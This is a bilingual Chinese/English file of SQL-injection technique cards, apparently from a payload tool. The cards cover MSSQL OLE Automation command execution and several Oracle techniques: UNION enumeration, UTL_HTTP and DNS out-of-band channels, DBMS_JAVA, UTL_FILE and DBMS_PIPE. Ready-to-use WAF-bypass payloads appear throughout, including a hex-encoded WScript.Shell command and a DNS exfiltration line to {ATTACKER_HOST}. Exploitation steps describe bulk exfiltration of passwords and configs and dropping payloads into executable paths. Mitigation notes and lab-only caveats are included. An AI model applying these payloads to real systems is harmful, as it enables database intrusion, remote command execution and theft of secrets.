mitigation.zh: 禁用 OLE Automation 并撤销 sysadmin 权限，服务账户最小化；修复后 sp_oacreate 应报组件禁用或权限错误，审计日志中不应出现 sp_oacreate 调用。
mitigation.en: Disable OLE Automation, revoke sysadmin privileges, and minimize the service account. After the fix, sp_oacreate must fail with a component-disabled or permission error, and audit logs must show no sp_oacreate calls.

title.zh: 确认注入点支持堆叠执行
title.en: Confirm the injection supports stacked statements

description.zh: OLE 利用需要连发多条语句，先用分号加 WAITFOR 或标记语句探测堆叠可用，不可堆叠则改走其他命令执行路径。
description.en: The OLE chain needs multiple stacked statements; confirm stacking via semicolon plus WAITFOR or a marker before proceeding.

title.zh: 开启 OLE Automation 并创建 Shell 对象
title.en: Enable OLE Automation and create a shell object

description.zh: 执行 sp_configure 开启 Ole Automation Procedures，随后 SP_OACREATE 创建 wscript.shell 对象，返回句柄即对象创建成功。
description.en: Enable Ole Automation Procedures via sp_configure, then SP_OACREATE a wscript.shell instance; the returned handle marks success.

title.en: Run a command via SP_OAMETHOD with file output

description.zh: 调用 SP_OAMETHOD 执行 cmd /c whoami 并把结果重定向到可访问文件，命令输出写入文件即命令执行通道打通。
description.en: Invoke SP_OAMETHOD to run cmd /c whoami and redirect output to a reachable file; written output confirms command execution.

title.zh: 读取输出文件回收结果
title.en: Read the output file to collect results

description.zh: 通过文件读取或 Web 访问拿回第 3 步输出的命令结果，确认当前主机身份后，可继续向可写路径落地进一步工具。
description.en: Retrieve the command output produced in step 3 through file read or web access, then continue landing tooling based on the host identity.

opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 sp_OACreate 明文前缀的匹配：用方括号引用对象名打断特征；文件生成且含 whoami 输出即成功。
description.en: Use bracket-quoted object names to break sp_OACreate prefix signatures; the output file containing whoami results confirms success.

description.zh: 绕过对 sp_configure+RECONFIGURE 连续开启语句的检测：关键字间插入注释；过程成功开启且对象创建无报错即成功。
description.en: Insert comments between the sp_configure/RECONFIGURE enabling sequence to defeat contiguous detection; successful enable and object creation confirm it.

wafBypass.command: ;DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run',NULL,CAST(0x77686F616D69207C2066696E642074727573746564202F636F6D7075746572203E206332 AS VARCHAR(99))--

description.zh: 绕过对 cmd 命令明文特征的拦截：待执行命令整体十六进制后 CAST 还原执行；命令执行痕迹出现即成功。
description.en: Hex-encode the whole command and CAST it back at execution time to evade plaintext cmd signatures; observed command side effects confirm success.

name.zh: Oracle UNION 枚举语义

description.zh: 将原混合条目中属于Oracle UNION 枚举语义的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UNION Enumeration Semantics into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle 注入的布尔对照与 UNION 枚举链：读取 v$version 版本 banner 与 all_users 用户清单，经 all_tables/all_tab_columns 遍历表与列结构。适用于确认后端为 Oracle 且 UNION 列数可对齐的场景。
overview.en: Covers the boolean-comparison and UNION enumeration chain for Oracle injection: reading the v$version banner and all_users listing, then traversing table and column structure via all_tables/all_tab_columns. Suitable when the backend is confirmed Oracle and UNION column counts can be aligned.

vulnerability.zh: 根因是输入拼接进 SQL 后未做参数化绑定，Oracle 的 FROM dual 语法与 ALL_* 字典视图使攻击者对齐列数后即可读取元数据；字典视图对普通用户默认可读，权限边界缺失放大了信息泄露面。
vulnerability.en: The root cause is input concatenated into SQL without parameterized binding: Oracle's FROM dual syntax and ALL_* dictionary views let an attacker read metadata once column counts are aligned. Dictionary views are readable by ordinary users by default, and missing privilege boundaries widen the disclosure surface.

exploitation.zh: 使用第 1 步主验证命令按行注入布尔对照与 UNION 查询：先读 v$version 与当前用户确认可控，再经 all_users 枚举用户清单，随后以 all_tables 与 all_tab_columns 逐级遍历表列结构；回显出现版本 banner、表名或列结构即确认字典可枚举。执行前把账户与对象名替换为隔离 marker，逐级推进并记录结果。
exploitation.en: Use the step 1 main verification command to inject boolean comparisons and UNION queries line by line: first read v$version and the current user to confirm controllability, enumerate users via all_users, then traverse table and column structures through all_tables and all_tab_columns; an echoed banner, table names, or column structure confirms the dictionary is enumerable. Replace account and object names with isolated markers before running, advancing level by level and recording results.

mitigation.zh: 参数化查询并撤销应用账户对敏感字典视图及业务数据之外的授权；修复后重放 UNION 载荷应报列不匹配或无回显，并在审计中监控 all_tables 等字典查询行为。
mitigation.en: Parameterize queries and revoke application-account grants beyond business data and sensitive dictionary views. After the fix, replaying UNION payloads must raise column-mismatch errors or produce no echo, with dictionary queries such as all_tables monitored in audit logs.

description.zh: 提交单引号与 OR 恒真条件，页面行为改变或触发 ORA 报错即确认参数可控，同时记录闭合方式供后续语句拼接使用。
description.en: Submit quote and OR-based tautologies; changed page behavior or ORA errors confirm a controllable parameter and its quoting style.

title.zh: UNION NULL FROM DUAL 对齐列数
title.en: Align columns with UNION NULL FROM DUAL

description.zh: 递增 NULL 数量并以 FROM DUAL 补齐 Oracle 必需表源，列数匹配时查询正常返回，即完成 UNION 结构对齐。
description.en: Increase NULL counts with FROM DUAL as the mandatory table source; a clean return means the UNION structure is aligned.

description.zh: 把 v$version 的 banner 或 v$instance 的 version 放进回显位，确认数据库版本后选择对应的提权与利用语句集。
description.en: Echo the banner from v$version or version from v$instance to identify the release and pick matching exploitation primitives.

title.zh: 枚举用户与表后提取数据
title.en: Enumerate users and tables, then dump data

description.zh: 从 ALL_USERS、ALL_TABLES 拿到账户与表清单，锁定敏感表后按列拼接查询逐行提取数据，完成信息收割。
description.en: List accounts and tables via ALL_USERS and ALL_TABLES, then query the sensitive table column by column to harvest its rows.

prerequisites.zh: 仅在隔离实例确认Oracle UNION 枚举语义所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UNION Enumeration Semantics in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle UNION 枚举语义的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UNION Enumeration Semantics evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

wafBypass.command: ' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--

description.zh: 绕过 UNION SELECT 被拦截的场景：利用域名解析报错带出 v$version 信息；报错文本含 Oracle 版本串即成功。
description.en: When UNION SELECT is blocked, leak v$version through the host-resolution error; an Oracle banner string in the error text confirms success.

description.zh: 绕过对 UNION/SELECT/FROM 全字匹配：关键字中部插入注释并混淆大小写；banner 列正常回显即成功。
description.en: Insert comments inside keywords and mix case to defeat whole-word matching; a normally echoed banner column confirms success.

wafBypass.command: ' UNION SELECT TO_CHAR(dbms_xmlgen.getxml('SELECT banner FROM v$version WHERE ROWNUM=1')),NULL FROM DUAL--

description.zh: 绕过对 v$version 直接列引用的审计：包一层 XML 生成函数聚合输出；XML 中含版本 banner 即成功。
description.en: Wrap the catalog query in dbms_xmlgen to avoid direct v$version column references; the banner inside the returned XML confirms success.

name.zh: Oracle UTL_HTTP 出站边界

description.zh: 将原混合条目中属于Oracle UTL_HTTP 出站边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UTL_HTTP Egress Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle 数据库带外（OOB）通道的验证：注入 UTL_HTTP.REQUEST 让数据库向自有监听器发起携带数据的 GET 请求。适用于回显受限、需用带外方式确认注入成立并外传数据的场景。
overview.en: Covers verification of an Oracle database out-of-band (OOB) channel: injecting UTL_HTTP.REQUEST so the database sends a GET request carrying data to an attacker-controlled listener. Suitable when echo is limited and injection must be confirmed and exfiltrated out-of-band.

vulnerability.zh: 根因是注入点可执行 UTL_HTTP 包且数据库出站网络未受限，攻击者把查询结果拼入请求 URL 即可让数据库主动外连；缺少出站 ACL 管控与包权限回收时，数据可绕过回显通道直接外带。
vulnerability.en: The root cause is an injection point able to invoke the UTL_HTTP package with unrestricted outbound networking: an attacker concatenates query results into the request URL to make the database connect out. Without outbound ACL controls and package-privilege revocation, data bypasses the echo channel and leaves directly.

exploitation.zh: 按第 1 步命令注入 UTL_HTTP.REQUEST，{ATTACKER_HOST} 渲染为自有监听域名；监听端收到携带数据的 GET 请求即确认出站 HTTP 与带外通道成立。先用固定 marker 验证数据库出站连通性，再把查询结果拼入 URL 分段外传，结束后核对监听日志与数据库会话的对应关系，排除其他来源干扰。
exploitation.en: Follow step 1: inject UTL_HTTP.REQUEST with {ATTACKER_HOST} rendered as your own listener domain; the listener receiving a data-carrying GET request confirms outbound HTTP and the OOB channel. Verify database outbound connectivity with a fixed marker first, then concatenate query results into the URL for segmented exfiltration, cross-checking listener logs against database sessions afterward to rule out other sources.

mitigation.zh: 回收应用账户对 UTL_HTTP 的 EXECUTE 权限，用 ACL 把数据库出站限制为白名单地址；修复后触发带外载荷监听端应无请求，防火墙记录中不应出现数据库发起的异常外连。
mitigation.en: Revoke EXECUTE on UTL_HTTP from application accounts and restrict database outbound traffic to allowlisted addresses via ACLs. After the fix, triggering the OOB payload must produce no listener request, and firewall logs must show no abnormal database-originated connections.

title.zh: 确认注入点与出网条件

description.zh: 先确认注入点可控并在外部服务器架好 HTTP 监听，目标数据库需允许 UTL_HTTP 出站，监听端无请求则网络侧被限制。
description.en: Confirm a working injection and stand up an HTTP listener; if no request arrives, the database's outbound network is restricted.

description.zh: 注入 UTL_HTTP.REQUEST，把子查询结果拼接进请求 URL 发往控制端，监听日志出现携带数据的请求即外带成功。
description.en: Inject UTL_HTTP.REQUEST with a subquery result concatenated into the URL; the listener receiving the data-bearing hit confirms exfiltration.

title.en: Swap subqueries to harvest in bulk

description.zh: 保持第 2 步载荷结构不变，替换括号内子查询为其他表与字段，逐批把口令、配置等敏感内容传出数据库边界。
description.en: Keep the step 2 payload skeleton and swap the inner subquery to move passwords, configs and other secrets out in batches.

prerequisites.zh: 仅在隔离实例确认Oracle UTL_HTTP 出站边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UTL_HTTP Egress Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle UTL_HTTP 出站边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UTL_HTTP Egress Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 UTL_HTTP 包名的监控：改用 HTTPURITYPE 类型发起出站请求；{ATTACKER_HOST} 收到来源请求即成功。
description.en: Swap UTL_HTTP for the HTTPURITYPE type to evade package-name monitoring; an inbound hit on {ATTACKER_HOST} confirms success.

wafBypass.command: '||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{ATTACKER_HOST}') FROM dual)||'

description.zh: 绕过对 HTTP 出站 URL 特征的检测：把数据拼进子域名走 DNS 解析出网；DNS 侧收到携带数据子域名的查询即成功。
description.en: Carry data inside a subdomain label via DNS resolution to evade HTTP URL signatures; a DNS query carrying the label confirms success.

description.zh: 绕过基于小写全串匹配的 UTL_HTTP 规则：注释分词加大小写混合保持原语可用；出站回访到达即成功。
description.en: Keep the primitive reachable while defeating lowercase full-string rules via comment splitting and case mixing; an arriving callback confirms success.

name.zh: Oracle DBMS_JAVA 包能力可见性

description.zh: 将原混合条目中属于Oracle DBMS_JAVA 包能力可见性的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle DBMS_JAVA Package Capability Visibility into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle DBMS_JAVA 包能力的可见性验证：以 CASE WHEN 条件查询 ALL_OBJECTS 与 ALL_TAB_PRIVS，判断包是否存在、当前用户是否持有 EXECUTE 权限。适用于评估 Oracle 注入能否借 Java 包升级为代码执行的前置判断。
overview.en: Covers visibility testing of the Oracle DBMS_JAVA package capability: using CASE WHEN conditions over ALL_OBJECTS and ALL_TAB_PRIVS to determine whether the package exists and whether the current user holds EXECUTE. Suitable as a pre-check for whether Oracle injection can escalate to code execution through Java packages.

vulnerability.zh: 根因是注入点可执行布尔条件并读取权限字典，DBMS_JAVA 等 Java 支持包一旦对注入账户开放 EXECUTE，就可能被用于运行 Java 代码；包权限未按需回收、权限字典可读，使攻击者能精确探测能力边界。
vulnerability.en: The root cause is an injection point able to run boolean conditions and read privilege dictionaries: once Java support packages such as DBMS_JAVA expose EXECUTE to the injected account, they may be used to run Java code. Unrecalled package grants and readable privilege dictionaries let attackers map capability boundaries precisely.

exploitation.zh: 使用第 1 步命令以 CASE WHEN 查询 ALL_OBJECTS 与 ALL_TAB_PRIVS；回显 PACKAGE_PRESENT 或 EXECUTE_GRANTED 等固定标记即确认包能力边界。先测包存在性，再测当前用户的 EXECUTE 授权，两类条件分别记录，形成完整能力矩阵后再评估借 Java 包升级代码执行的可行性。两类条件均为阴性时，把 Oracle Java 组件判定为不可用并转入其他升级路径评估。
exploitation.en: Use the step 1 command with CASE WHEN over ALL_OBJECTS and ALL_TAB_PRIVS; fixed markers such as PACKAGE_PRESENT or EXECUTE_GRANTED confirm the package capability boundary. Test package existence first, then the current user's EXECUTE grant, recording both condition families separately to build a full capability matrix before assessing Java-package code-execution escalation. When both conditions are negative, judge the Oracle Java component unavailable and move to other escalation paths.

mitigation.zh: 撤销应用账户对 DBMS_JAVA 等高危包的 EXECUTE 授权，收敛 ALL_* 字典可见范围；修复后重放探测载荷应返回 ABSENT 或 DENIED 类阴性标记。
mitigation.en: Revoke EXECUTE on high-risk packages such as DBMS_JAVA from application accounts and narrow ALL_* dictionary visibility. After the fix, replaying the probes must return negative markers such as ABSENT or DENIED.

title.zh: 检查 DBMS_JAVA 包是否存在
title.en: Check whether the DBMS_JAVA package exists

description.zh: 注入对 ALL_OBJECTS 的 EXISTS 查询，回显 PACKAGE_PRESENT 说明 SYS.DBMS_JAVA 可用，回显 ABSENT 则该利用路径关闭。
description.en: Inject an EXISTS probe against ALL_OBJECTS; PACKAGE_PRESENT means SYS.DBMS_JAVA is available while PACKAGE_ABSENT closes this path.

title.zh: 规划 Java 存储过程执行链
title.en: Plan the Java stored procedure chain

description.zh: 包存在时可用 DBMS_JAVA 创建类或调用执行引擎运行系统命令，结合第 1 步结果准备建类语句与命令参数逐段推进。
description.en: With the package present, build DBMS_JAVA classes or invoke its execution engine for OS commands, staging statements per the step 1 result.

title.zh: 不可用时切换替代利用路径
title.en: Pivot to alternative paths when unavailable

description.zh: 包缺失时放弃 Java 链，改走 UTL_FILE 读写文件或 DBMS_SCHEDULER 创建定时任务等 Oracle 常规提权路径继续推进。
description.en: If absent, drop the Java chain and pivot to UTL_FILE file access or DBMS_SCHEDULER job creation to keep the attack moving.

prerequisites.zh: 仅在隔离实例确认Oracle DBMS_JAVA 包能力可见性所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle DBMS_JAVA Package Capability Visibility in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle DBMS_JAVA 包能力可见性的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle DBMS_JAVA Package Capability Visibility evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

wafBypass.command: ' UNION SELECT 1,CASE WHEN EXISTS(SELECT 1 FROM ALL_OBJECTS WHERE OWNER='SYS' AND OBJECT_NAME='DBMS_'||'JAVA') THEN 1 ELSE 0 END,3 FROM DUAL--

description.zh: 绕过对 DBMS_JAVA 字面量的整串过滤：对象名拆两段拼接再比对；返回 1 即包存在。
description.en: Split the DBMS_JAVA literal into concatenated halves to defeat full-string filters; a returned 1 confirms the package exists.

wafBypass.command: ' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT COUNT(*) FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE 'DBMS_JAVA%'))--

description.zh: 绕过 UNION 通道限制：以对象计数作为解析参数触发报错回显；报错中的计数值大于 0 即包存在。
description.en: Use the object count as a resolution parameter to leak it via error when UNION is unavailable; a count greater than 0 in the error confirms presence.

title.zh: 注释分词 EXISTS 子查询

description.zh: 绕过对 CASE WHEN EXISTS 组合特征的拦截：逐段插入内联注释；条件列仍能正确返回 1/0 即成功。
description.en: Insert inline comments segment by segment against CASE WHEN EXISTS signature matching; correct 1/0 conditional output confirms success.

name.zh: Oracle UTL_FILE Marker 能力

description.zh: 将原混合条目中属于Oracle UTL_FILE Marker 能力的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UTL_FILE Marker Capability into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle UTL_FILE 目录访问能力的验证：调用 UTL_FILE.FGETATTR 探测隔离目录中 marker 文件的存在性，以固定标记区分可达与不可达。适用于评估数据库服务端文件系统访问边界与 DIRECTORY 对象授权的场景。
overview.en: Covers verification of Oracle UTL_FILE directory access capability: calling UTL_FILE.FGETATTR to probe the existence of a marker file in an isolated directory, with fixed markers distinguishing reachable from unreachable. Suitable for assessing the database server filesystem access boundary and DIRECTORY object grants.

vulnerability.zh: 根因是注入账户对部分 DIRECTORY 对象具备 READ/WRITE 授权，UTL_FILE 即可访问对应路径的文件；DIRECTORY 授权过宽且注入点可调用该包时，数据库文件系统能力被注入直接触达。
vulnerability.en: The root cause is READ/WRITE grants on some DIRECTORY objects held by the injected account, letting UTL_FILE access files under those paths; overly broad DIRECTORY grants combined with an injection point that can invoke the package expose filesystem capability directly.

exploitation.zh: 用第 1 步命令调用 UTL_FILE.FGETATTR 探测隔离目录中的 marker 文件；返回 PAYLOADER_MARKER_PRESENT 即确认目录访问能力，返回 ABSENT 则目录不可达或权限缺失。预先在授权环境放置 marker 文件，逐个 DIRECTORY 对象探测并记录结果，形成数据库文件系统访问能力清单供后续评估引用。
exploitation.en: Use the step 1 command to call UTL_FILE.FGETATTR against the marker file in an isolated directory; returning PAYLOADER_MARKER_PRESENT confirms directory access, while ABSENT means unreachable or missing privileges. Place the marker file in the authorized environment beforehand, probing DIRECTORY objects one by one and recording results to build a database filesystem access inventory for later assessment.

mitigation.zh: 审计并收敛 DIRECTORY 对象授权，仅保留必要路径的最小 READ/WRITE；修复后重放探测应返回 ABSENT，并定期复查 ALL_TAB_PRIVS 中 UTL_FILE 相关授权是否回弹。
mitigation.en: Audit and narrow DIRECTORY object grants, keeping only minimal READ/WRITE on required paths. After the fix, replaying the probe must return ABSENT, and ALL_TAB_PRIVS must be reviewed periodically to ensure UTL_FILE-related grants have not returned.

description.zh: 在注入点执行 FGETATTR 调用，语句被接受且返回属性值，说明 UTL_FILE 已安装并有可访问的目录对象，具备文件操作基础。
description.en: Execute a FGETATTR call at the injection point; accepted execution with attribute values means UTL_FILE is installed with usable directory objects.

description.zh: 对目录对象内指定文件查询存在性与长度属性，存在标志返回真即文件可精确定位，为后续读取或写入选定具体攻击目标。
description.en: Query existence and length for a named file in the directory object; a true existence flag pins down the target for later read or write.

description.zh: 目录与文件确认后，用 FOPEN 配合读行写行操作文件内容，可读取配置密钥或向可执行路径写入落地载荷扩大控制。
description.en: With directory and file confirmed, use FOPEN-based read/write to pull secrets from configs or drop payloads into executable paths.

prerequisites.zh: 仅在隔离实例确认Oracle UTL_FILE Marker 能力所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UTL_FILE Marker Capability in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle UTL_FILE Marker 能力的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UTL_FILE Marker Capability evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

wafBypass.command: ' UNION SELECT 1,owner||'.'||directory_name||'='||directory_path,3 FROM ALL_DIRECTORIES WHERE ROWNUM<=3--

description.zh: 绕过对 UTL_FILE.FGETATTR 调用特征的监控：先枚举目录对象确认可写目录面；回显目录清单即获得 UTL_FILE 边界线索。
description.en: Enumerate directory objects instead of calling UTL_FILE.FGETATTR to evade its invocation signature; an echoed directory list yields the UTL_FILE attack surface.

wafBypass.command: ' AND (SELECT COUNT(*) FROM ALL_OBJECTS WHERE OBJECT_NAME='UTL_'||'FILE')>0--

description.zh: 绕过对 UTL_FILE 全字匹配：对象名拼接后计数比较；真值与假值响应可区分即成功。
description.en: Concatenate the object name before counting to defeat exact matching on UTL_FILE; distinguishable true/false responses confirm success.

wafBypass.command: DECLARE v_exists BOOLEAN; BEGIN /*x*/UTL_FILE/*x*/.FGETATTR('PAYLOADER_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block); DBMS_OUTPUT.PUT_LINE('LEN='||v_length); END;

description.zh: 绕过对 FGETATTR 语句整体的规则匹配：在包名与调用间插入注释保持语义；DBMS_OUTPUT 输出文件长度即成功。
description.en: Insert comments around the package and call while preserving semantics; a printed file length via DBMS_OUTPUT confirms success.

name.zh: Oracle DBMS_PIPE 会话缓冲边界

description.zh: 将原混合条目中属于Oracle DBMS_PIPE 会话缓冲边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle DBMS_PIPE Session-Buffer Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle DBMS_PIPE 会话缓冲写入能力的验证：把 marker 打包进管道缓冲并复位指针，以固定标记确认缓冲可写。适用于评估注入会话间侧信道通信可行性与管道对象权限边界的场景。
overview.en: Covers verification of Oracle DBMS_PIPE session-buffer write capability: packing a marker into the pipe buffer and resetting the buffer pointer, with a fixed marker confirming writability. Suitable for assessing feasibility of inter-session side-channel communication and pipe object privilege boundaries.

vulnerability.zh: 根因是注入账户对 DBMS_PIPE 具备 EXECUTE 权限且管道对象未按会话隔离，攻击者可在管道缓冲写入数据供其他会话读取；管道因此可充当注入会话间的隐蔽通信信道，权限与命名空间管控缺失是根源。
vulnerability.en: The root cause is EXECUTE privilege on DBMS_PIPE for the injected account plus pipe objects not isolated per session: an attacker can write data into the pipe buffer for other sessions to read, turning pipes into a covert channel between injection sessions. Missing privilege and namespace controls are the source.

exploitation.zh: 用第 1 步命令把 marker 打包进 DBMS_PIPE 会话缓冲并复位缓冲指针；返回 PAYLOADER_MARKER_PACKED 即确认管道缓冲可写。再用第二个会话对同一管道执行 RECEIVE_MESSAGE 读取 marker，验证会话间侧信道闭环；两个会话分别记录并使用唯一管道名，排除同名管道残留干扰。
exploitation.en: Use the step 1 command to pack the marker into the DBMS_PIPE session buffer and reset the buffer pointer; returning PAYLOADER_MARKER_PACKED confirms the buffer is writable. Then run RECEIVE_MESSAGE on the same pipe from a second session to read the marker, closing the inter-session side-channel loop; record both sessions separately with unique pipe names to rule out residual same-named pipes.

mitigation.zh: 回收应用账户对 DBMS_PIPE 的 EXECUTE 权限，限制管道命名与创建范围；修复后重放打包载荷应报权限错误，并在审计中监控跨会话的管道读写行为。
mitigation.en: Revoke EXECUTE on DBMS_PIPE from application accounts and restrict pipe naming and creation. After the fix, replaying the pack payload must raise a permission error, with cross-session pipe reads and writes monitored in audit logs.

title.zh: 确认注入点语句执行可控
title.en: Confirm statement execution at the injection point

description.zh: 先用恒真或报错载荷确认注入点可控并支持 PL/SQL 块执行，DBMS_PIPE 利用需要匿名块被数据库整体接受执行。
description.en: Confirm the injection is controllable and accepts PL/SQL blocks; the DBMS_PIPE technique requires the whole anonymous block to execute.

title.en: Pack a message into a named pipe

description.zh: 执行匿名块调用 PACK_MESSAGE 打包标记串并复位缓冲，输出行出现标记即管道写入路径可用，为侧信道建立基础通道。
description.en: Run an anonymous block that packs a marker string and resets the buffer; the marker in output proves the pipe-write path works.

title.zh: 用 RECEIVE_MESSAGE 延迟做侧信道
title.en: Build a side channel with RECEIVE_MESSAGE waits

description.zh: 以 RECEIVE_MESSAGE 指定秒数等待消息作延迟信号，真假条件映射不同等待时长，据此逐位推断数据库内容完成盲取。
description.en: Use RECEIVE_MESSAGE with a chosen wait as the delay signal; map true/false conditions to different waits and infer data bit by bit.

prerequisites.zh: 仅在隔离实例确认Oracle DBMS_PIPE 会话缓冲边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle DBMS_PIPE Session-Buffer Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle DBMS_PIPE 会话缓冲边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle DBMS_PIPE Session-Buffer Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 DBMS_PIPE.PACK_MESSAGE 连续特征的拦截：在成员访问处插入注释；输出通道仍打印 marker 即成功。
description.en: Insert comments at member-access points to break the DBMS_PIPE.PACK_MESSAGE signature while the output channel still prints the marker.

description.zh: 绕过对固定 marker 明文的告警：消息拆两段运行时拼接；管道缓冲写入无异常即成功。
description.en: Split the marker into two runtime-concatenated halves to evade plaintext marker alerts; an error-free pipe write confirms success.

